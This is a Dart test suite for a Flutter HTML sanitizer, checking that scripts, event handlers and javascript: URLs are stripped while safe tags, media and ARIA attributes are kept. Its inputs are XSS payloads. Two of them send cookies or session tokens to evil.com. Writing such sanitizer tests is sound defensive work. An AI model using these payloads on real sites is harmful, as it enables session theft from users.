import "package:hyper_render/hyper_render.dart";
import 'package:flutter_test/flutter_test.dart';

void main() {
  group('HtmlSanitizer', () {
    group('Dangerous Tags Removal', () {
      test('removes script tags', () {
        const html = '<p>Hello</p><script>alert("XSS")</script><p>World</p>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('script')));
        expect(result, isNot(contains('alert')));
        expect(result, contains('<p>Hello</p>'));
        expect(result, contains('<p>World</p>'));
      });

      test('removes iframe tags', () {
        const html = '<p>Content</p><iframe src="evil.com"></iframe>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('iframe')));
        expect(result, contains('<p>Content</p>'));
      });

      test('removes style tags', () {
        const html = '<style>body { background: red; }</style><p>Text</p>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('style')));
        expect(result, isNot(contains('background')));
      });

      test('removes form elements', () {
        const html = '<form><input type="text"><button>Submit</button></form>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('form')));
        expect(result, isNot(contains('input')));
        expect(result, isNot(contains('button')));
      });

      test('removes object and embed tags', () {
        const html = '<object data="evil.swf"></object><embed src="evil.swf">';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('object')));
        expect(result, isNot(contains('embed')));
      });
    });

    group('Event Handler Removal', () {
      test('removes onclick handler', () {
        const html = '<p onclick="alert(\'XSS\')">Click me</p>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('onclick')));
        expect(result, contains('<p>Click me</p>'));
      });

      test('removes onerror handler', () {
        const html = '<img src="x" onerror="alert(\'XSS\')">';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('onerror')));
        expect(result, contains('<img'));
      });

      test('removes all event handlers', () {
        const html = '''
          <div onload="bad()" onmouseover="bad()" onmouseout="bad()">
            Content
          </div>
        ''';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('onload')));
        expect(result, isNot(contains('onmouseover')));
        expect(result, isNot(contains('onmouseout')));
      });
    });

    group('JavaScript URL Removal', () {
      test('removes javascript: URLs from href', () {
        const html = '<a href="javascript:alert(\'XSS\')">Link</a>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('javascript:')));
      });

      test('removes javascript: URLs from src', () {
        const html = '<img src="javascript:alert(\'XSS\')">';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('javascript:')));
      });

      test('removes data: URLs except images', () {
        const html = '<a href="data:text/html,<script>alert(1)</script>">Bad</a>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('data:text/html')));
      });

      test('allows data: URLs for images', () {
        const html = '<img src="data:image/png;base64,iVBORw0KGgo=">';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('data:image/png'));
      });
    });

    group('Whitelist Approach', () {
      test('keeps allowed tags', () {
        const html = '''
          <p>Paragraph</p>
          <h1>Heading</h1>
          <strong>Bold</strong>
          <a href="https://example.com">Link</a>
          <img src="https://example.com/image.jpg" alt="Image">
        ''';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('<p>'));
        expect(result, contains('<h1>'));
        expect(result, contains('<strong>'));
        expect(result, contains('<a'));
        expect(result, contains('<img'));
      });

      test('removes disallowed tags', () {
        const html = '<marquee>Moving text</marquee><blink>Blinking</blink>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('marquee')));
        expect(result, isNot(contains('blink')));
      });

      test('custom allowed tags', () {
        const html = '<p>Para</p><div>Div</div><span>Span</span>';
        final result = HtmlSanitizer.sanitize(
          html,
          allowedTags: ['p', 'span'],
        );

        expect(result, contains('<p>'));
        expect(result, contains('<span>'));
        expect(result, isNot(contains('<div')));
      });
    });

    group('Attribute Sanitization', () {
      test('keeps safe attributes', () {
        const html = '<a href="https://example.com" title="Link" class="btn">Link</a>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('href'));
        expect(result, contains('title'));
        expect(result, contains('class'));
      });

      test('removes dangerous attributes', () {
        const html = '<div onclick="bad()" formaction="/evil" data="evil">Content</div>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('onclick')));
        expect(result, isNot(contains('formaction')));
        expect(result, isNot(contains('data=')));
      });

      test('allows data-* attributes when enabled', () {
        const html = '<div data-id="123" data-name="test">Content</div>';
        final result = HtmlSanitizer.sanitize(
          html,
          allowDataAttributes: true,
        );

        expect(result, contains('data-id'));
        expect(result, contains('data-name'));
      });

      test('blocks data-* attributes by default', () {
        const html = '<div data-id="123">Content</div>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('data-id')));
      });

      test('escapes attribute values', () {
        const html = '<a title="Quote: &quot; Ampersand: &amp;">Link</a>';
        final result = HtmlSanitizer.sanitize(html);

        // Attribute values should be escaped
        expect(result, contains('title'));
      });
    });

    group('CJK Support', () {
      test('keeps ruby tags', () {
        const html = '<ruby>漢字<rt>かんじ</rt></ruby>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('<ruby>'));
        expect(result, contains('<rt>'));
      });
    });

    group('Table Support', () {
      test('keeps table elements', () {
        const html = '''
          <table>
            <thead><tr><th>Header</th></tr></thead>
            <tbody><tr><td colspan="2">Data</td></tr></tbody>
          </table>
        ''';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('<table>'));
        expect(result, contains('<thead>'));
        expect(result, contains('<tbody>'));
        expect(result, contains('<tr>'));
        expect(result, contains('<th>'));
        expect(result, contains('<td'));
        expect(result, contains('colspan'));
      });
    });

    group('Details/Summary Support', () {
      test('keeps details and summary tags', () {
        const html = '<details><summary>Title</summary>Content</details>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('<details>'));
        expect(result, contains('<summary>'));
      });
    });

    group('Media Support (video/audio)', () {
      test('keeps video tag with src and controls', () {
        const html = '<video src="v.mp4" controls width="320" height="180"></video>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('video'));
        expect(result, contains('src'));
        expect(result, contains('controls'));
      });

      test('keeps audio tag', () {
        const html = '<audio src="a.mp3" controls></audio>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('audio'));
        expect(result, contains('src'));
      });

      test('keeps poster attribute on video', () {
        const html = '<video src="v.mp4" poster="p.jpg"></video>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('poster'));
        expect(result, contains('p.jpg'));
      });

      test('keeps source tag inside video', () {
        const html = '<video><source src="v.mp4" type="video/mp4"></video>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('source'));
      });

      test('keeps autoplay, muted, loop on video', () {
        const html = '<video src="v.mp4" autoplay muted loop></video>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('autoplay'));
        expect(result, contains('muted'));
        expect(result, contains('loop'));
      });

      test('strips event handlers from video', () {
        const html = '<video src="v.mp4" onclick="evil()" onerror="bad()"></video>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('onclick')));
        expect(result, isNot(contains('onerror')));
        expect(result, contains('video'));
      });

      test('strips javascript: src from video', () {
        const html = '<video src="javascript:alert(1)"></video>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('javascript:')));
      });

      test('keeps figure and figcaption', () {
        const html = '<figure><img src="i.jpg"><figcaption>Caption</figcaption></figure>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('figure'));
        expect(result, contains('figcaption'));
        expect(result, contains('Caption'));
      });
    });

    group('BUG-D — ARIA / accessibility attributes preserved (regression)', () {
      test('aria-label is kept through sanitization', () {
        const html = '<a href="/home" aria-label="Go to homepage">Home</a>';
        final result = HtmlSanitizer.sanitize(html);
        expect(result, contains('aria-label'));
        expect(result, contains('Go to homepage'));
      });

      test('role attribute is kept through sanitization', () {
        const html = '<div role="button" aria-label="Close">X</div>';
        final result = HtmlSanitizer.sanitize(html);
        expect(result, contains('role="button"'));
        expect(result, contains('aria-label="Close"'));
      });

      test('aria-hidden is kept through sanitization', () {
        const html = '<span aria-hidden="true">decorative</span>';
        final result = HtmlSanitizer.sanitize(html);
        expect(result, contains('aria-hidden="true"'));
      });

      test('aria-expanded is kept through sanitization', () {
        const html = '<nav aria-label="Main navigation" aria-expanded="true"><ul></ul></nav>';
        final result = HtmlSanitizer.sanitize(html);
        expect(result, contains('aria-label'));
        expect(result, contains('aria-expanded'));
      });

      test('event handlers are still stripped even alongside aria attributes', () {
        const html = '<div role="button" aria-label="Click me" onclick="evil()">X</div>';
        final result = HtmlSanitizer.sanitize(html);
        expect(result, contains('role="button"'));
        expect(result, contains('aria-label'));
        expect(result, isNot(contains('onclick')));
      });
    });

    group('Danger Detection', () {
      test('detects script tags', () {
        const html = '<p>Hello</p><script>alert(1)</script>';
        final result = HtmlSanitizer.containsDangerousContent(html);

        expect(result, isTrue);
      });

      test('detects javascript: URLs', () {
        const html = '<a href="javascript:alert(1)">Link</a>';
        final result = HtmlSanitizer.containsDangerousContent(html);

        expect(result, isTrue);
      });

      test('detects event handlers', () {
        const html = '<div onclick="bad()">Content</div>';
        final result = HtmlSanitizer.containsDangerousContent(html);

        expect(result, isTrue);
      });

      test('returns false for safe HTML', () {
        const html = '<p>Safe <strong>content</strong></p>';
        final result = HtmlSanitizer.containsDangerousContent(html);

        expect(result, isFalse);
      });
    });

    group('Real World Examples', () {
      test('sanitizes comment form XSS attempt', () {
        const html = '''
          <p>Great article!</p>
          <img src="x" onerror="fetch('https://evil.com?cookie='+document.cookie)">
        ''';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('onerror')));
        expect(result, isNot(contains('fetch')));
        expect(result, contains('<p>Great article!</p>'));
      });

      test('sanitizes stored XSS in blog post', () {
        const html = '''
          <h2>Blog Title</h2>
          <script>
            // Steal session
            window.location='https://evil.com?s='+sessionStorage.token;
          </script>
          <p>Blog content...</p>
        ''';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('script')));
        expect(result, isNot(contains('sessionStorage')));
        expect(result, contains('<h2>Blog Title</h2>'));
        expect(result, contains('<p>Blog content...</p>'));
      });

      test('sanitizes DOM-based XSS', () {
        const html = '<a href="javascript:void(document.body.innerHTML=\'Hacked\')">Click</a>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('javascript:')));
        expect(result, contains('<a'));
      });
    });
  });
}
